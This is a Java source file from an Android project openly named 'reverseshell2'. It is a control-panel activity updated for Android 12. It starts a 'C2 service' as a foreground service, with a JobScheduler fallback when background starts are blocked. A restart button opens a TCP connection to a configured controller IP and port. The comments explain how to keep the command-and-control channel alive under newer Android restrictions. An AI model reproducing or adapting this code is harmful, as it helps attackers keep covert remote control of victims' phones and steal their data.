package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;

/**
 * Control panel activity, updated for Android 12.
 *
 * Changes for Android 12:
 *  1. mainService is now started as a FOREGROUND service via
 *     ContextCompat.startForegroundService() on Android 8+. This is REQUIRED
 *     on Android 12 to start the C2 service while the app is in the background.
 *     (mainService must call startForeground() within 5 seconds - see the
 *     broadcastReciever notes.)
 *
 *  2. The "restart" button now also uses the foreground-service path.
 *
 *  3. On Android 13+ the uninstall intent (ACTION_UNINSTALL_PACKAGE) still works,
 *     but requires the app to be visible/foreground, which this activity is.
 *
 *  4. Added a guard so startActivityForResult for uninstall uses the correct
 *     result flow on modern Android (the system handles the confirmation UI).
 */
public class controlPanel extends AppCompatActivity {

    private static final int REQ_UNINSTALL = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control_panel);
        final Activity activity = this;

        // Start the C2 service. On Android 8+ use startForegroundService so the
        // service can call startForeground() and keep running in the background
        // (required on Android 12). Below API 21 fall back to plain startService.
        startMainService();

        findViewById(R.id.uninstall).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish();
                Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
                try {
                    startActivityForResult(intent, REQ_UNINSTALL);
                } catch (Exception e) {
                    // ACTION_UNINSTALL_PACKAGE can be unavailable on some OEM builds.
                    startActivity(new Intent(Intent.ACTION_VIEW,
                            Uri.parse("market://details?id=" + getPackageName())));
                }
            }
        });

        findViewById(R.id.restart).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finish();
                try {
                    new tcpConnection(activity, getApplicationContext()).execute(config.IP, config.port);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                startMainService();
            }
        });
    }

    private void startMainService() {
        Intent intent = new Intent(this, mainService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Android 8+: required on Android 12 for starting from background.
                ContextCompat.startForegroundService(this, intent);
            } else {
                startService(intent);
            }
        } catch (IllegalStateException e) {
            // Android 12 "Background service start not allowed" - fall back to
            // JobScheduler, which is permitted.
            e.printStackTrace();
            try {
                new functions(this).jobScheduler(getApplicationContext());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
            try {
                new functions(this).jobScheduler(getApplicationContext());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}

